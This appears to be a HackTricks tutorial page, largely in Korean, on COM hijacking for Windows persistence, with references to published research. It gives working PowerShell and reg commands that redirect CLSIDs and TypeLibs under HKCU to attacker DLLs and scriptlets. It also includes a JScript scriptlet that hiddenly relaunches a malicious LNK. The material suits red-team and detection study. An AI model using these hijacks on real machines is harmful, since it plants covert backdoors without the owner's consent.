# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 존재하지 않는 COM 컴포넌트 검색

HKCU 값은 사용자가 수정할 수 있으므로 **COM Hijacking**은 **persistence mechanism**으로 사용될 수 있습니다. `procmon`을 사용하면 공격자가 생성할 수 있는 아직 존재하지 않는 COM 레지스트리를 쉽게 찾을 수 있습니다. 일반적인 필터:

- **RegOpenKey** 작업.
- _Result_가 **NAME NOT FOUND**인 항목.
- 그리고 _Path_가 **InprocServer32**로 끝나는 항목.

탐색(헌팅) 중 유용한 변형:

- 누락된 **`LocalServer32`** 키도 확인하세요. 일부 COM 클래스는 프로세스 외부 서버(out-of-process servers)이므로 DLL 대신 공격자가 제어하는 EXE를 실행합니다.
- `InprocServer32` 외에도 **`TreatAs`** 및 **`ScriptletURL`** 레지스트리 작업을 검색하세요. 최근 탐지 콘텐츠와 악성코드 분석에서 이 항목들을 계속 언급하는데, 일반 COM 등록보다 훨씬 드물어 신호가 강하기 때문입니다.
- HKCU로 등록을 복제할 때 원본 `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`에서 정당한 **`ThreadingModel`**을 복사하세요. 잘못된 모델을 사용하면 활성화가 실패하고 hijack이 감지 노이즈를 유발하는 경우가 많습니다.
- 64비트 시스템에서는 64비트와 32비트 뷰 둘 다 검사하세요 (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` 및 `HKLM\Software\Classes\WOW6432Node`). 32비트 애플리케이션은 다른 COM 등록을 해석할 수 있기 때문입니다.

어떤 존재하지 않는 COM을 가장할지 결정했으면 다음 명령을 실행하세요. _몇 초마다 로드되는 COM을 가장하면 과도할 수 있으니 주의하세요._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### 탈취 가능한 Task Scheduler COM 구성요소

Windows 작업은 Custom Triggers를 사용해 COM 객체를 호출하며, Task Scheduler를 통해 실행되므로 트리거 시점을 예측하기가 더 쉽습니다.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

출력 결과를 확인하면, 예를 들어 **사용자가 로그인할 때마다** 실행되는 작업을 선택할 수 있습니다.

이제 CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** 를 **HKEY\CLASSES\ROOT\CLSID** 및 HKLM, HKCU에서 검색하면, 일반적으로 해당 값이 HKCU에는 존재하지 않습니다.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
그런 다음 HKCU 항목을 만들기만 하면 사용자가 로그인할 때마다 백도어가 실행됩니다.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs`는 한 CLSID를 다른 CLSID로 에뮬레이트할 수 있게 합니다. 공격자 관점에서 이는 원래 CLSID를 건드리지 않고, `scrobj.dll`을 가리키는 두 번째 사용자별 CLSID를 생성한 뒤 실제 COM 객체를 `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`로 악성 CLSID로 리디렉션할 수 있다는 뜻입니다.

This is useful when:

- 대상 애플리케이션이 로그인 시점 또는 앱 시작 시 이미 고정된 CLSID를 인스턴스화하는 경우
- 원래 `InprocServer32`를 교체하는 대신 레지스트리만으로 리디렉션하려는 경우
- 로컬 또는 원격 `.sct` 스크립틀릿을 `ScriptletURL` 값으로 실행하려는 경우

Example workflow (adapted from public Atomic Red Team tradecraft and older COM registry abuse research):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
참고:

- `scrobj.dll`는 `ScriptletURL` 값을 읽고 참조된 `.sct`를 실행하므로 페이로드를 로컬 파일로 두거나 HTTP/HTTPS로 원격에서 가져올 수 있습니다.
- `TreatAs`는 원래 COM 등록이 HKLM에 완전하고 안정적으로 존재할 때 특히 유용합니다. 전체 트리를 미러링할 필요 없이 소규모의 사용자별 리디렉션만 있으면 되기 때문입니다.
- 자연스러운 트리거를 기다리지 않고 검증하려면, 대상 클래스가 STA 활성화를 지원하는 경우 `rundll32.exe -sta <ProgID-or-CLSID>`로 가짜 ProgID/CLSID를 수동으로 인스턴스화할 수 있습니다.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib)은 COM 인터페이스를 정의하며 `LoadTypeLib()`를 통해 로드됩니다. COM 서버가 인스턴스화될 때, OS는 `HKCR\TypeLib\{LIBID}` 아래의 레지스트리 키를 참조하여 연관된 TypeLib을 로드할 수 있습니다. TypeLib 경로가 **moniker**로 대체되면(예: `script:C:\...\evil.sct`), TypeLib가 해결될 때 Windows는 스크립틀렛을 실행합니다 — 이는 일반 구성 요소가 호출될 때 트리거되는 은밀한 persistence를 제공합니다.

이는 Microsoft Web Browser control에 대해 관찰되었습니다(자주 Internet Explorer, WebBrowser를 임베드한 앱, 심지어 `explorer.exe`에 의해 로드됩니다).

### 단계 (PowerShell)

1) 높은 빈도로 호출되는 CLSID가 사용하는 TypeLib (LIBID)를 식별합니다. 악성코드 체인에서 자주 악용되는 예시 CLSID: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) 사용자별 TypeLib 경로를 `script:` 모니커를 사용하여 로컬 scriptlet로 지정합니다 (관리자 권한 불필요):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) 주 페이로드(예: 초기 체인에서 사용된 `.lnk`)를 재실행하는 최소한의 JScript `.sct`를 배치하세요:
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE를 열거나 WebBrowser control을 임베드한 애플리케이션을 실행하거나, 심지어 평상시의 Explorer 활동만으로도 TypeLib가 로드되어 scriptlet이 실행되며, logon/reboot 시 체인이 재장전됩니다.

정리
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
참고

- 동일한 논리를 다른 사용 빈도가 높은 COM 구성 요소에도 적용할 수 있습니다; 항상 먼저 `HKCR\CLSID\{CLSID}\TypeLib`에서 실제 `LIBID`를 확인하세요.
- 64비트 시스템에서는 64비트 소비자를 위해 `win64` 하위 키도 채울 수 있습니다.

## 참조

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
